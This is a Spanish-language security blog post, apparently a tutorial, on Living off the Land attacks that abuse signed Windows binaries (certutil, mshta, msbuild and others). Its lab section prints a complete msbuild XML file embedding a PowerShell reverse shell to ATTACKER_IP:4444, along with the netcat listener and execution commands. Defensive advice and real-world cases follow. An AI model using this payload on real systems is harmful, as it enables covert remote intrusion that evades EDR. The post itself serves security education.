**Negrita**, _cursiva_, `c√≥digo`, > citas

<span class="text-orange-400 font-semibold">resaltado con color</span>

<p class="text-center text-lg">P√°rrafo centrado y m√°s grande</p>

<mark>marcado</mark> y <u>subrayado</u>

<img
    src="/publicaciones/livingon.jpg"
    alt="LOTL"
    loading="lazy"
    class="w-1/2 h-auto mx-auto rounded-xl"
  />


*******************************   CREATE POST **********************************

## üìå Introducci√≥n
En el vasto campo de la ciberseguridad ofensiva, los ataques m√°s exitosos no son siempre los m√°s sofisticados, sino los m√°s discretos. En 2025, una t√©cnica sigue siendo extremadamente eficaz y a menudo ignorada por soluciones EDR: los ataques *Living off the Land* (LotL), que utilizan binarios leg√≠timos del sistema operativo, conocidos como **LOLBins** (*Living Off the Land Binaries*).

Este art√≠culo profundiza en c√≥mo operan estos ataques, por qu√© siguen siendo v√°lidos hoy, c√≥mo puedes probarlos en entornos controlados y qu√© medidas tomar para detectarlos y mitigarlos.

---

## üß† ¬øQu√© es "Living off the Land"?
Es una t√©cnica donde el atacante utiliza herramientas leg√≠timas del sistema operativo para ejecutar sus cargas maliciosas, evitando as√≠ las detecciones tradicionales.

<div class="not-prose grid md:grid-cols-2 gap-3 my-4">
  <div class="card bg-base-200"><div class="card-body p-4"><h3 class="card-title text-sm">certutil.exe</h3><p class="opacity-80 text-sm">Descarga de archivos desde Internet</p></div></div>
  <div class="card bg-base-200"><div class="card-body p-4"><h3 class="card-title text-sm">mshta.exe</h3><p class="opacity-80 text-sm">Ejecuci√≥n de c√≥digo remoto v√≠a HTML/JS</p></div></div>
  <div class="card bg-base-200"><div class="card-body p-4"><h3 class="card-title text-sm">powershell.exe</h3><p class="opacity-80 text-sm">Automatizaci√≥n y ejecuci√≥n de c√≥digo</p></div></div>
  <div class="card bg-base-200"><div class="card-body p-4"><h3 class="card-title text-sm">rundll32.exe</h3><p class="opacity-80 text-sm">Ejecuci√≥n de DLLs o evasi√≥n</p></div></div>
  <div class="card bg-base-200"><div class="card-body p-4"><h3 class="card-title text-sm">wmic.exe</h3><p class="opacity-80 text-sm">Reconocimiento y ejecuci√≥n remota</p></div></div>
  <div class="card bg-base-200"><div class="card-body p-4"><h3 class="card-title text-sm">regsvr32.exe</h3><p class="opacity-80 text-sm">DLLs remotas (Squiblydoo)</p></div></div>
  <div class="card bg-base-200 md:col-span-2"><div class="card-body p-4"><h3 class="card-title text-sm">msbuild.exe</h3><p class="opacity-80 text-sm">Compilaci√≥n/ejecuci√≥n de payloads sin tocar disco</p></div></div>
</div>

---

## üéØ ¬øPor qu√© es tan eficaz en 2025?
- Persisten en sistemas actualizados: binarios leg√≠timos presentes en Windows 10/11.  
- Evasi√≥n de antivirus/EDR: firmados por Microsoft ‚Üí confianza por defecto.  
- Muchas acciones no requieren privilegios elevados.  
- Permiten pivotar y escalar privilegios con bajo perfil.

<div class="alert alert-info my-4">
  <span>En seguridad defensiva, prioriza <b>detecci√≥n basada en comportamiento</b> antes que firmas est√°ticas.</span>
</div>

---

## ‚öîÔ∏è Escenario de laboratorio: Abusar de <code>msbuild.exe</code> para ejecutar una reverse shell
> **Solo en entornos controlados**. Respeta la ley y pol√≠ticas de tus clientes.

**Objetivo:** Obtener una shell remota utilizando `msbuild.exe` con un archivo XML especialmente dise√±ado.  
**Requisitos:** Windows 10/11, `msbuild.exe` (Visual Studio o Build Tools), y Netcat en la m√°quina atacante.
---
### 1Ô∏è‚É£ Preparar el payload XML (`reverse.xml`)
  <div class="mt-3 rounded-xl bg-base-200 text-base-content shadow ring-1 ring-base-300 overflow-hidden">
    <div class="flex items-center gap-2 px-4 py-2 border-b border-base-300">
      <!-- puntitos decorativos estilo ventana -->
      <span class="inline-flex gap-1 mr-2">
        <span class="w-2.5 h-2.5 rounded-full bg-base-300"></span>
        <span class="w-2.5 h-2.5 rounded-full bg-base-300"></span>
        <span class="w-2.5 h-2.5 rounded-full bg-base-300"></span>
      </span>
      <span class="text-xs font-medium">reverse.xml</span>
    </div>
  <div class="not-prose md:max-w-3xl mx-auto">
  <pre class="block w-full rounded-xl bg-base-200 text-base-content px-4 py-4 font-mono text-xs leading-5 whitespace-pre overflow-x-auto overflow-y-hidden">
&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
  &lt;Target Name="ReverseShell"&gt;
    &lt;Exec Command="powershell -nop -w hidden -c &quot;$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}&quot;" /&gt;
  &lt;/Target&gt;
&lt;/Project&gt;
  </pre>
</div>
</div>

## ‚ö†Ô∏è Reemplaza ATTACKER_IP por tu IP real.

---
### 2Ô∏è‚É£ Iniciar listener en tu Kali:
  <pre class="block w-full rounded-xl bg-base-200 text-base-content px-4 py-4 font-mono text-xs leading-5 whitespace-pre overflow-x-auto overflow-y-hidden">
nc -lvnp 4444
  </pre>

### 3Ô∏è‚É£ Ejecutar el payload en la m√°quina Windows:
  <pre class="block w-full rounded-xl bg-base-200 text-base-content px-4 py-4 font-mono text-xs leading-5 whitespace-pre overflow-x-auto overflow-y-hidden">
msbuild.exe reverse.xml
  </pre>

## Si todo funciona correctamente, deber√≠as obtener una reverse shell directamente desde una herramienta leg√≠tima de Microsoft.

---

üõ°Ô∏è ¬øC√≥mo defenderse?
EDR con reglas de comportamiento, no solo de firmas.
Bloqueo de **LOLBins** no utilizados en tu entorno *(Applocker/SRP/WDAC)*.
Monitoreo activo de procesos inusuales como <code>msbuild.exe</code> ejecutando conexiones de red.
Deshabilitar componentes no necesarios de Windows *(ej. scripting, macros, PowerShell sin restricciones)*.

---

üìÅ Casos reales (Resumen)
**APT32** (OceanLotus): uso extensivo de <code>regsvr32.exe</code> para ejecutar DLLs remotas.
**FIN7**: abuso de <code>mshta.exe</code> y <code>msbuild.exe</code> para cargar malware sin escribir en disco.
**Ransomware modernos** (Lockbit, BlackCat): uso de PowerShell y LOLBins en fases de reconocimiento y ejecuci√≥n lateral.

---

‚úÖ Conclusi√≥n
Los ataques **LotL** y **LOLBins** no son algo del pasado; son t√©cnicas activas y **extremadamente efectivas** en 2025. Saber c√≥mo funcionan, replicarlos en entornos controlados y defenderse de ellos no solo te posiciona como un experto, sino que fortalece enormemente la seguridad de tus clientes.